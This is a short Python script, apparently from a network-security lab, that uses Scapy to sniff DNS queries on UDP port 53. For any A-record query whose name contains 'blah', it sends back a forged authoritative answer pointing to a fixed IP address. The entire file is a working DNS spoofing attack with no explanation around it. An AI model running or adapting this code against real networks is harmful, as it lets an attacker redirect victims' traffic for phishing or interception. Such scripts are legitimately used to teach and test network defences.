from scapy.all import *

spoofIp = '172.24.28.45'

def spoofPacket(pkt):
	if (pkt.haslayer(DNSQR) and pkt[DNS].qr == 0 and pkt[DNSQR].qtype ==1 and "blah" in pkt[DNSQR].qname):
		print pkt.show()
		spfPkt = IP(src=pkt[IP].dst, dst=pkt[IP].src)\
				/UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)\
				/DNS(id=pkt[DNS].id, qr=1, ancount=1, aa=1, qd=pkt[DNS].qd,
					an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=spoofIp))
		print spfPkt.show()
		send(spfPkt)

sniff(filter='udp port 53', prn=spoofPacket)
#dns.qry.name=="blah124.com"